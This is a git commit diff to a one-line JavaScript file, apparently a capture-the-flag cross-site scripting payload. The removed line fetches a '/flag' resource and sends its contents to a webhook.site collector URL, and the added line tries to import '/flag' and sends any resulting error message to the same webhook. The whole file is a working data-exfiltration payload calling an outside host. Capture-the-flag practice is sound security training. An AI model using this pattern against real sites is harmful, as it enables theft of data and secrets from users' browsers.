68a29fbea4209092718568fecf97dc6f7224007f
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-16 14:19:05 +0100

    Change fetch to import for flag retrieval

--- x.js
+++ x.js
@@ -1,1 +1,1 @@
-fetch('/flag').then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)));
+import('/flag').catch(e => fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?error='+e));
